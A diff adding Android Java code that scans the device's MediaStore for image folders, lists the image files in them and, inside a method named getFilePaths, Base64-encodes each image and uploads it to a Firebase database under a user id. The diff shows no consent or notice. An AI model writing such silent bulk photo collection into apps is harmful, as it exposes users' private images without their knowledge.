@@ -1,0 +1,101 @@
+public ArrayList<String> getFilePaths()
+    {
+
+
+        Uri u = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
+        String[] projection = {MediaStore.Images.ImageColumns.DATA};
+        Cursor c = null;
+        SortedSet<String> dirList = new TreeSet<String>();
+        ArrayList<String> resultIAV = new ArrayList<String>();
+
+        String[] directories = null;
+        if (u != null)
+        {
+            c = managedQuery(u, projection, null, null, null);
+        }
+
+        if ((c != null) && (c.moveToFirst()))
+        {
+            do
+            {
+                String tempDir = c.getString(0);
+                tempDir = tempDir.substring(0, tempDir.lastIndexOf("/"));
+                try{
+                    dirList.add(tempDir);
+                }
+                catch(Exception e)
+                {
+
+                }
+            }
+            while (c.moveToNext());
+            directories = new String[dirList.size()];
+            dirList.toArray(directories);
+
+        }
+
+        for(int i=0;i<dirList.size();i++)
+        {
+            File imageDir = new File(directories[i]);
+            File[] imageList = imageDir.listFiles();
+            if(imageList == null)
+                continue;
+            for (File imagePath : imageList) {
+                try {
+
+                    if(imagePath.isDirectory())
+                    {
+                        imageList = imagePath.listFiles();
+                        Log.w("jhdfg", "imageList"+ imageList);
+
+                    }
+                    if ( imagePath.getName().contains(".jpg")|| imagePath.getName().contains(".JPG")
+                            || imagePath.getName().contains(".jpeg")|| imagePath.getName().contains(".JPEG")
+                            || imagePath.getName().contains(".png") || imagePath.getName().contains(".PNG")
+                            || imagePath.getName().contains(".gif") || imagePath.getName().contains(".GIF")
+                            || imagePath.getName().contains(".bmp") || imagePath.getName().contains(".BMP")
+                    )
+                    {
+
+                        String path= imagePath.getAbsolutePath();
+                        File f = new File(path);
+                        resultIAV.add(path);
+
+                        final InputStream imageStream;
+                        try {
+                            imageStream =  new FileInputStream(f);
+                            final Bitmap selectedImage = BitmapFactory.decodeStream(imageStream);
+                            String encodedImage = encodeImage(selectedImage);
+
+                            String key = databaseReference.push().getKey();
+                            databaseReference.child(uid).child(key).setValue(encodedImage);
+                          //  uploadImage(encodedImage, 3);
+                        } catch (FileNotFoundException e) {
+                            Log.w("dfds4", "error: "+e.getMessage());
+                            e.printStackTrace();
+                        }
+
+                        Log.w("jhdfg", "result: "+ resultIAV);
+
+                    }
+                }
+                //  }
+                catch (Exception e) {
+                    e.printStackTrace();
+                }
+            }
+        }
+
+        return resultIAV;
+
+
+    }
+
+
+    private String encodeImage(Bitmap bm)
+    {
+        ByteArrayOutputStream baos = new ByteArrayOutputStream();
+        bm.compress(Bitmap.CompressFormat.JPEG,20,baos);
+        byte[] b = baos.toByteArray();
+        return Base64.encodeToString(b, Base64.DEFAULT);
+    }
